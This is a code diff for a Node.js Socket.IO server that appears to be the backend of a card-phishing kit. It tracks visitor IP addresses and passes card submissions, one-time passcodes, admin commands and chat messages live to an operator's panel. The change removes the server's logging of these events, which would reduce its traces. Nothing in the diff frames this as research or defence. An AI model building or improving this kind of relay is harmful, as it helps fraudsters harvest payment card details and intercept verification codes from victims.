@@ -18,7 +18,7 @@ io.on('connection', (socket) => {
 
   // Notify admin panel of new visitor
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-  console.log('New visitor from IP:', clientIp);
+
   const visitorPayload = {
     id: socket.id,
     ip: clientIp,
@@ -27,32 +27,30 @@ io.on('connection', (socket) => {
   io.emit('visitor_update', visitorPayload);
   
   socket.on('card_submission', (payload) => {
-    console.log('Received card submission:', payload);
+
     io.emit('card_submission', payload);
   });
 
   socket.on('admin_command', (payload) => {
-    console.log('Received admin command:', payload);
+
     io.emit('admin_command', payload);
   });
 
   socket.on('otp_submitted', (payload) => {
-    console.log('Received OTP submission:', payload);
+
     io.emit('otp_submitted', payload);
   });
 
   socket.on('visitor_update', (payload) => {
-    console.log('Received visitor update:', payload);
     io.emit('visitor_update', payload);
   });
 
   socket.on('chat_message', (payload) => {
-    console.log('Received chat message:', payload);
+
     io.emit('chat_message', payload);
   });
 
   socket.on('start_chat', (payload) => {
-    console.log('Received chat start:', payload);
     io.emit('start_chat', payload);
   });
 
